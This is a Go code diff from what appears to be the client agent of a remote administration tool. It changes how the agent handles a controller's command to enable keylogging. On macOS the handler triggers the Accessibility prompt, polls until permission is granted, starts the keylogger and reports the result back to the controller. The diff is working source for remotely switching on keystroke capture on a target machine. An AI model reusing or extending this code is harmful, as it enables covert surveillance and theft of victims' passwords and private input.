@@ -4,14 +4,31 @@ import (
 	"context"
 	"encoding/base64"
 	"log"
+	"time"
 
 	"overlord-client/cmd/agent/runtime"
 	"overlord-client/cmd/agent/wire"
 )
 
+func waitForKeyloggerPermission(env *runtime.Env, timeout time.Duration) bool {
+	if env.Keylogger == nil {
+		return false
+	}
+	deadline := time.Now().Add(timeout)
+	for {
+		if env.Keylogger.HasPermission() {
+			return true
+		}
+		if time.Now().After(deadline) {
+			return false
+		}
+		time.Sleep(350 * time.Millisecond)
+	}
+}
+
 // HandleKeylogRequestPermission handles the keylog_request_permission command.
 // On macOS it triggers the Accessibility permission prompt and reports back
-// whether permission was granted.  On other platforms it reports that no
+// whether permission was granted. On other platforms it reports that no
 // permission gate exists and the keylogger is already running (or starts it).
 func HandleKeylogRequestPermission(ctx context.Context, env *runtime.Env, cmdID string) error {
 	if env.Keylogger == nil {
@@ -46,8 +63,32 @@ func HandleKeylogRequestPermission(ctx context.Context, env *runtime.Env, cmdID 
 	}
 
 	// macOS: trigger the OS accessibility prompt and wait for the result.
+	if env.Keylogger.HasPermission() {
+		granted := true
+		if !env.Keylogger.IsRunning() {
+			if err := env.Keylogger.Start(); err != nil {
+				log.Printf("[keylogger] start after existing permission check failed: %v", err)
+				return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
+					"type":      "keylog_permission_result",
+					"commandId": cmdID,
+					"granted":   false,
+					"reason":    "start_failed: " + err.Error(),
+				})
+			}
+		}
+		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
+			"type":      "keylog_permission_result",
+			"commandId": cmdID,
+			"granted":   granted,
+			"reason":    "granted",
+		})
+	}
+
 	log.Printf("[keylogger] macOS: requesting accessibility permission")
 	granted := env.Keylogger.RequestPermission()
+	if !granted {
+		granted = waitForKeyloggerPermission(env, 8*time.Second)
+	}
 
 	if granted {
 		// Start the keylogger now that we have permission.
